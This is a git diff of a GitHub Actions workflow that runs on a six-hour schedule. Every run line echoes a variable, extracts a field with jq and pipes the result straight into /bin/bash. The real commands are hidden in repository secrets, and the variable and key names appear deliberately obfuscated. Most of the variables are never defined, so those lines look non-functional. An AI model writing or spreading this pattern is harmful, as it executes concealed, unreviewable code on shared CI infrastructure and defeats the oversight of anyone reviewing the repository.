@@ -3,23 +3,29 @@ name: majhabnk
 on:
   workflow_dispatch:
   schedule:
-    - cron: '29 2/6 * * *'
+    - cron: '0 5/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: majhabnk
         env:
-          k81604: ${{ secrets.k81604 }}
+          fwa333: ${{ secrets.fwa333 }}
         run: |
-          echo $k81604 | jq -r .giag6432 | /bin/bash
-          echo $cdbpj1082 | jq -r .cqlma2821 | /bin/bash
-          echo $a9276 | jq -r .pnke19 | /bin/bash
-          echo $fu916 | jq -r .ysivv58682 | /bin/bash
-          echo $mkyje1413 | jq -r .hml9848 | /bin/bash
-          echo $ljc05846 | jq -r .j82 | /bin/bash
-          echo $gxtk4 | jq -r .s2 | /bin/bash
+          echo $fwa333 | jq -r .ou4 | /bin/bash
+          echo $ov9 | jq -r .cpr65275 | /bin/bash
+          echo $fnks90115 | jq -r .ypcd90 | /bin/bash
+          echo $gvqi17 | jq -r .u5 | /bin/bash
+          echo $iwpi3720 | jq -r .o4764 | /bin/bash
+          echo $px4986 | jq -r .pcuel14 | /bin/bash
+          echo $legmn1 | jq -r .l695 | /bin/bash
+          echo $b62726 | jq -r .khxbz222 | /bin/bash
+          echo $eqf42948 | jq -r .p7 | /bin/bash
+          echo $d30 | jq -r .jzul58329 | /bin/bash
+          echo $ky81350 | jq -r .ifok7 | /bin/bash
+          echo $oi67 | jq -r .auhm48272 | /bin/bash
+          echo $lie25330 | jq -r .ib5 | /bin/bash
+          echo $wmr95562 | jq -r .cv113 | /bin/bash
 
